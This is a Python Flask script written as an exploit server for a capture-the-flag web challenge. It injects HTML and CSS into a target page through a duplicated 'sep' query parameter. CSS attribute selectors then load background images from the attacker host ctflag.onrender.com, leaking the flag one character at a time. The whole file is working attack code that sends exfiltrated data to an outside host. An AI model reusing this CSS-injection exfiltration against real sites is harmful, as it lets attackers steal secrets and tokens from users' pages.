from flask import Flask, request, redirect
import urllib.parse
import sys
import os

app = Flask(__name__)

# ==========================================
MY_URL = "https://ctflag.onrender.com"
TARGET_URL = "http://web:3000"
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_}"
KNOWN_FLAG = "tkbctf{"
# ==========================================

@app.route('/start')
def start():
    global KNOWN_FLAG
    KNOWN_FLAG = "tkbctf{"
    print("[*] Attack Started! Resetting flag...", file=sys.stderr)
    
    html = """
    <!DOCTYPE html>
    <html>
    <body>
      <h1>Exploit Loading...</h1>
      <script>
        setTimeout(() => { window.location.href = '/n'; }, 500);
      </script>
    </body>
    </html>
    """
    return html

@app.route('/n')
def next_char():
    global KNOWN_FLAG
    if KNOWN_FLAG.endswith("}"):
        print(f"Attack Finished! Flag: {KNOWN_FLAG}")
        return f"<h1>Attack Finished!</h1><p>Flag: {KNOWN_FLAG}</p>"

    current_pos = len(KNOWN_FLAG)
    print(f"[*] Current Flag: {KNOWN_FLAG} (Length: {current_pos})", file=sys.stderr)

    css_rules = []
    for char in CHARSET:
        safe_char = urllib.parse.quote(char)
        # Firefox対策として padding: 5px を追加（確実に高さを出す）
        rule = f"a:nth-of-type({current_pos})[id='{char}']{{display:block;padding:5px;background:url({MY_URL}/l?c={safe_char}&p={current_pos})}}"
        css_rules.append(rule)

    css_payload = "".join(css_rules)

    sep0 = f'"></style><meta http-equiv="refresh" content="1.0;url={MY_URL}/n"><style>{css_payload}</style>'
    sep1 = '<a id="'

    # 【超重要修正】 'sep[]' ではなく 'sep' を使う！
    # これにより ?sep=...&sep=... という正しい配列バイパスが完成する
    params = urllib.parse.urlencode({'sep': [sep0, sep1]}, doseq=True)
    exploit_url = f"{TARGET_URL}/?{params}"
    
    return redirect(exploit_url)

@app.route('/l')
def leak():
    global KNOWN_FLAG
    char = request.args.get('c')
    pos = request.args.get('p', type=int)

    if char and pos == len(KNOWN_FLAG):
        KNOWN_FLAG += char
        print(f"[+] Leaked! New Flag: {KNOWN_FLAG}", file=sys.stderr)

    transparent_gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
    return transparent_gif, 200, {'Content-Type': 'image/gif'}

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)